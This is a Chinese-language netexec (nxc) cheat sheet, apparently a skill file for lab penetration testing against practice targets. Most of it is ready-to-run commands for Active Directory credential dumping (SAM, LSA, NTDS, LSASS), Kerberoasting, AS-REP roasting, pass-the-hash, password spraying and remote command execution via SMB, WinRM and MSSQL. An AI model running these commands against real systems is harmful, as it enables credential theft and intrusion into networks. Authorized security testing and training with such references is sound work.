---
name: 'netexec-reference'
description: 'netexec (nxc) 全面参考：SMB/LDAP/WinRM/MSSQL 核心命令、模块、密码喷洒、与 crackmapexec 对比'
disable-model-invocation: true
metadata: { domain: tools, tier: T2 }
---

# netexec (nxc) — CrackMapExec 继任者全面参考

## 协议: smb / ldap / winrm / mssql / ssh / ftp / rdp / vnc / wmi

## SMB 最常用
```bash
nxc smb 10.10.10.0/24                                    # 扫描 + signing 检测
nxc smb 10.10.10.10 -u 'u' -p 'p' --shares               # 共享枚举
nxc smb 10.10.10.10 -u 'u' -p 'p' --users --groups       # 用户/组
nxc smb 10.10.10.10 -u 'u' -p 'p' --loggedon-users       # 谁登录着
nxc smb 10.10.10.10 -u 'u' -p 'p' --rid-brute            # RID 爆破用户
nxc smb 10.10.10.10 -u 'u' -p 'p' --pass-pol             # 密码策略
nxc smb 10.10.10.10 -u 'u' -p 'p' -x 'whoami'            # cmd 执行
nxc smb 10.10.10.10 -u 'u' -p 'p' --sam / --lsa / --ntds # dump
nxc smb 10.10.10.0/24 --gen-relay-list targets.txt       # 找可 relay 主机
```text

## LDAP 最常用
```bash
nxc ldap 10.10.10.10 -u 'u' -p 'p' --users --groups --computers
nxc ldap 10.10.10.10 -u 'u' -p 'p' --asreproast asrep.txt
nxc ldap 10.10.10.10 -u 'u' -p 'p' --kerberoasting kerb.txt
nxc ldap 10.10.10.10 -u 'u' -p 'p' -M user-desc         # ⚠️ description 密码宝库
nxc ldap 10.10.10.10 -u 'u' -p 'p' -M dmsa               # dMSA 账户
nxc ldap 10.10.10.10 -u 'u' -p 'p' -M laps               # LAPS 密码
nxc ldap 10.10.10.10 -u 'u' -p 'p' -M adcs               # ADCS 枚举
nxc ldap 10.10.10.10 -u 'u' -p 'p' -M daclread -o TARGET=user WRITE=true
```text

## WinRM
```bash
nxc winrm 10.10.10.10 -u 'u' -p 'p'                      # 验证
nxc winrm 10.10.10.10 -u 'u' -H 'HASH'                   # PTH
nxc winrm 10.10.10.10 -u 'u' -p 'p' -x 'whoami'          # 执行
```text

## MSSQL
```bash
nxc mssql 10.10.10.10 -u 'sa' -p 'pass'                  # 验证
nxc mssql 10.10.10.10 -u 'sa' -p 'pass' -M mssql_priv    # 权限检查
nxc mssql 10.10.10.10 -u 'sa' -p 'pass' -x 'whoami'      # xp_cmdshell
nxc mssql 10.10.10.10 -u 'sa' -p 'pass' --enable-xpcmdshell
```text

## 模块 (nxc smb -L / nxc ldap -L)
- lsassy / nanodump → dump LSASS 凭据
- spider_plus → 递归文件搜索
- slinky → 找 .vhd/.xml/.config
- ioxidresolver → 找 Web/DB config
- nopac → noPAC 漏洞检测
- wcc → Windows凭据收集器

## 密码喷洒
```bash
nxc smb 10.10.10.10 -u users.txt -p 'SinglePass!' --no-bruteforce
nxc smb 10.10.10.10 -u users.txt -p pwd.txt --continue-on-success
```text

## 对比 cme
- 语法 95% 相同，直接替换 `crackmapexec` → `nxc` 或 `netexec`
- LDAP/WinRM/MSSQL 独立协议模块（cme 是靠 -M 模块凑的）
- 默认 `--continue-on-success`（cme 默认单次成功就停）
- Kali 安装: `apt install netexec` 或已有

**Why:** 一直在用 crackmapexec 老习惯，但 cme 已停止维护。netexec 有更丰富的协议支持和模块生态。
**How to apply:** 所有新靶机使用 nxc 代替 crackmapexec；SMB 扫描直接用 nxc smb（自带 signing 检测）。
